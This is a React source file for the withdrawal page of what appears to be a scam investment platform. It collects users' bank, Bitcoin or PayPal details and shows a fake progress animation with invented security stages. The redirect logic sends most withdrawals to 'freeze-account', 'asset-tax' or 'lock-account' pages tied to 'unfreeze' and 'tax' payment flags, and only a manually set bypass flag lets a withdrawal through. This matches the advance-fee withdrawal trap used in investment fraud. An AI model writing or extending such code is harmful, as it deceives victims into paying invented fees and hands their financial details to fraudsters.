import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { initiateWithdrawal, getSettings, notifyWithdrawalProcessing } from '../../services/api';
import toast from 'react-hot-toast';
import {
  LuArrowUpRight as ArrowUpRight,
  LuArrowLeft as ArrowLeft,
  LuWallet as Wallet,
  LuBuilding2 as Building2,
  LuBitcoin as Bitcoin,
  LuMail as Mail,
  LuCircleAlert as AlertCircle,
  LuShieldCheck as ShieldCheck,
  LuRefreshCw as RefreshCw,
  LuCircleCheck as CheckCircle2,
} from 'react-icons/lu';
import './WithdrawView.css';

export const WithdrawView = () => {
  const { user, refreshUser } = useAuth();
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);
  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('Bank/Wire Transfer');
  const [bankAccountNum, setBankAccountNum] = useState('');
  const [bankFullName, setBankFullName] = useState(`${user?.firstName || ''} ${user?.lastName || ''}`);
  const [bankName, setBankName] = useState('');
  const [accountType, setAccountType] = useState('Checking');
  const [routingNumber, setRoutingNumber] = useState('');
  const [btcWalletAddress, setBtcWalletAddress] = useState('');
  const [paypalId, setPaypalId] = useState('');
  const [errorMessage, setErrorMessage] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const [processingStage, setProcessingStage] = useState('Initializing Liquidity Channel...');
  const [activeTxDetails, setActiveTxDetails] = useState(null);
  const [isRefreshing, setIsRefreshing] = useState(true);

  // All hooks must be called unconditionally
  useEffect(() => {
    const doRefresh = async () => {
      setIsRefreshing(true);
      await refreshUser();
      setIsRefreshing(false);
    };
    doRefresh();

    const handleFocus = () => {
      doRefresh();
    };
    window.addEventListener('focus', handleFocus);
    return () => window.removeEventListener('focus', handleFocus);
  }, [refreshUser]);

  // Redirect logic via useEffect (no early returns)
  useEffect(() => {
    if (isRefreshing) return;
    if (!user) return;

    if (user.isLocked) {
      navigate('/lock-account');
      return;
    }
    if (user.hasPaidUnfreeze && !user.hasPaidTax) {
      navigate('/asset-tax');
      return;
    }
    if (user.isFrozen && !user.hasPaidUnfreeze) {
      navigate('/freeze-account');
      return;
    }
  }, [user, navigate, isRefreshing]);

  // Additional effect for settings
  useEffect(() => {
    getSettings().then(data => {
      if (data.success) setSettings(data.settings);
    }).catch(() => {});
  }, []);

  const numAmount = parseFloat(amount) || 0;
  const isInsufficient = numAmount > (user?.balance || 0);

  const minWithdrawal = settings?.minWithdrawalAmount || 50;
  const maxWithdrawal = settings?.maxWithdrawalAmount || 5000000;

  // Processing timer (10 seconds)
  useEffect(() => {
    if (!isProcessing) return;
    const totalDurationMs = 10000;
    const intervalMs = 100;
    const increment = (90 / (totalDurationMs / intervalMs));
    let cancelled = false;

    const timer = setInterval(() => {
      setProgress(prev => {
        const next = prev + increment;
        if (next >= 90) {
          clearInterval(timer);
          setTimeout(async () => {
            if (cancelled) return;
            setIsProcessing(false);
            if (!activeTxDetails) return;

            // Re-fetch latest user state before initiating withdrawal
            const latestUser = await refreshUser().catch(() => null);
            const currentUser = latestUser || user;

            if (currentUser?.isLocked) {
              navigate('/lock-account');
              return;
            }
            if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
              navigate('/asset-tax');
              return;
            }
            if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
              navigate('/freeze-account');
              return;
            }

            try {
              const result = await initiateWithdrawal(user.id, activeTxDetails.amount, activeTxDetails.method, activeTxDetails.details);
              await refreshUser();

              if (result.user?.isLocked) {
                navigate('/lock-account');
              } else if (result.user?.hasPaidUnfreeze && !result.user?.hasPaidTax) {
                navigate('/asset-tax');
              } else if (result.user?.isFrozen && !result.user?.hasPaidUnfreeze) {
                navigate('/freeze-account');
              } else if (result.user?.bypassVerification) {
                toast.success('Withdrawal approved instantly!');
                navigate('/dashboard');
              } else {
                navigate('/freeze-account');
              }
            } catch (err) {
              const message = err?.response?.data?.error || err.message || 'Withdrawal initiation failed.';
              if (err?.response?.status === 403 && message.toLowerCase().includes('locked')) {
                await refreshUser();
                navigate('/lock-account');
              } else {
                setErrorMessage(message);
              }
            }
          }, 400);
          return 90;
        }
        if (next < 25) setProcessingStage('🔐 Authenticating Security Token...');
        else if (next < 50) setProcessingStage('⚡ Establishing Gateway with Provider...');
        else if (next < 75) setProcessingStage(`🌐 Routing $${activeTxDetails?.amount?.toLocaleString()}...`);
        else setProcessingStage('🛡️ Verifying Multi-Signature Clearance...');
        return next;
      });
    }, intervalMs);

    return () => {
      cancelled = true;
      clearInterval(timer);
    };
  }, [isProcessing, activeTxDetails, user, navigate, refreshUser]);

  const handleWithdrawSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage(null);

    // Refresh latest user first
    const latestUser = await refreshUser().catch(() => null);
    const currentUser = latestUser || user;

    // Guard: if locked, redirect immediately
    if (currentUser?.isLocked) {
      navigate('/lock-account');
      return;
    }

    if (currentUser?.hasPaidUnfreeze && !currentUser?.hasPaidTax) {
      navigate('/asset-tax');
      return;
    }

    if (currentUser?.isFrozen && !currentUser?.hasPaidUnfreeze) {
      navigate('/freeze-account');
      return;
    }

    if (numAmount > (currentUser?.balance || 0)) { setErrorMessage('Insufficient balance.'); return; }
    if (numAmount < minWithdrawal) { setErrorMessage(`Min: $${minWithdrawal}`); return; }
    if (numAmount > maxWithdrawal) { setErrorMessage(`Max: $${maxWithdrawal}`); return; }

    let details = {};
    if (method === 'Bank/Wire Transfer') {
      if (!bankAccountNum.trim() || !bankName.trim() || !bankFullName.trim()) {
        setErrorMessage('Fill all bank fields.');
        return;
      }
      details = {
        bankDetails: {
          accountNumber: bankAccountNum.trim(),
          fullName: bankFullName.trim(),
          bankName: bankName.trim(),
          accountType,
          routingNumber: routingNumber.trim() || undefined
        }
      };
    } else if (method === 'Bitcoin') {
      if (!btcWalletAddress.trim()) { setErrorMessage('Provide Bitcoin address.'); return; }
      details = { btcAddress: btcWalletAddress.trim() };
    } else if (method === 'Paypal') {
      if (!paypalId.trim()) { setErrorMessage('Provide PayPal ID.'); return; }
      details = { paypalAccount: paypalId.trim() };
    }

    const txReference = `WTR-${Date.now().toString().slice(-6)}`;
    setActiveTxDetails({ amount: numAmount, method, details, reference: txReference });
    setProgress(0);
    setProcessingStage('🔐 Authenticating...');
    setIsProcessing(true);

    notifyWithdrawalProcessing(user, numAmount, method, details, txReference).catch(() => {});
    toast.success('Withdrawal processing started...');
  };

  if (isRefreshing) {
    return (
      <div className="withdraw-view">
        <div className="loading-spinner">Loading...</div>
      </div>
    );
  }

  return (
    <div className="withdraw-view">
      <button className="back-btn" onClick={() => navigate('/dashboard')}>
        <ArrowLeft /> Back to Dashboard
      </button>

      {isProcessing && (
        <div className="processing-modal">
          <div className="modal-content">
            <div className="spinner"><RefreshCw /></div>
            <h2>Disbursing ${activeTxDetails?.amount?.toLocaleString() || numAmount.toLocaleString()}</h2>
            <p className="stage">{processingStage}</p>
            <div className="progress-bar"><div style={{ width: `${progress}%` }} /></div>
            <div className="telemetry">
              <span><CheckCircle2 /> Verified</span>
              <span><ShieldCheck /> Secure</span>
            </div>
          </div>
        </div>
      )}

      <div className="withdraw-container">
        <div className="header">
          <ArrowUpRight /> <div><h1>Institutional Withdrawal</h1><p>Direct fiat settlement, crypto wallet, or digital payout</p></div>
        </div>

        <div className="balance-display">
          <Wallet /> Available: <strong>${(user?.balance || 0).toLocaleString()}</strong>
        </div>

        {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}

        <form onSubmit={handleWithdrawSubmit} className="withdraw-form">
          <div className="form-group">
            <label>Amount to Withdraw ($ USD)</label>
            <div className="input-with-symbol">
              <span>$</span>
              <input
                type="number"
                min="1"
                step="any"
                required
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <button type="button" onClick={() => setAmount(user?.balance?.toString() || '0')}>WITHDRAW ALL</button>
            </div>
            {isInsufficient && <small className="error">Insufficient balance</small>}
          </div>

          <div className="form-group">
            <label>Select Mode of Withdrawal</label>
            <div className="method-grid">
              <button type="button" className={method === 'Bank/Wire Transfer' ? 'active' : ''} onClick={() => setMethod('Bank/Wire Transfer')}>
                <Building2 /> Bank / Wire
              </button>
              <button type="button" className={method === 'Bitcoin' ? 'active' : ''} onClick={() => setMethod('Bitcoin')}>
                <Bitcoin /> Bitcoin
              </button>
              <button type="button" className={method === 'Paypal' ? 'active' : ''} onClick={() => setMethod('Paypal')}>
                <Mail /> PayPal
              </button>
            </div>
          </div>

          {method === 'Bank/Wire Transfer' && (
            <div className="bank-details">
              <div className="form-row">
                <div><label>Bank Name</label><input type="text" required value={bankName} onChange={e => setBankName(e.target.value)} /></div>
                <div><label>Account Holder</label><input type="text" required value={bankFullName} onChange={e => setBankFullName(e.target.value)} /></div>
              </div>
              <div className="form-row">
                <div><label>Account Number</label><input type="text" required value={bankAccountNum} onChange={e => setBankAccountNum(e.target.value)} /></div>
                <div><label>Account Type</label>
                  <select value={accountType} onChange={e => setAccountType(e.target.value)}>
                    <option>Checking</option><option>Savings</option><option>Other</option>
                  </select>
                </div>
              </div>
              <div><label>Routing / Swift (Optional)</label><input type="text" value={routingNumber} onChange={e => setRoutingNumber(e.target.value)} /></div>
            </div>
          )}

          {method === 'Bitcoin' && (
            <div className="btc-details">
              <label>Destination Bitcoin Wallet Address</label>
              <input type="text" required placeholder="bc1q..." value={btcWalletAddress} onChange={e => setBtcWalletAddress(e.target.value)} />
            </div>
          )}

          {method === 'Paypal' && (
            <div className="paypal-details">
              <label>PayPal Email or Username</label>
              <input type="text" required placeholder="user@paypal.me" value={paypalId} onChange={e => setPaypalId(e.target.value)} />
            </div>
          )}

          <button type="submit" disabled={isInsufficient || isProcessing} className="btn-primary">
            {isInsufficient ? 'Insufficient Balance' : isProcessing ? 'Processing...' : `Withdraw $${numAmount.toLocaleString()} Now`}
          </button>
        </form>
      </div>
    </div>
  );
};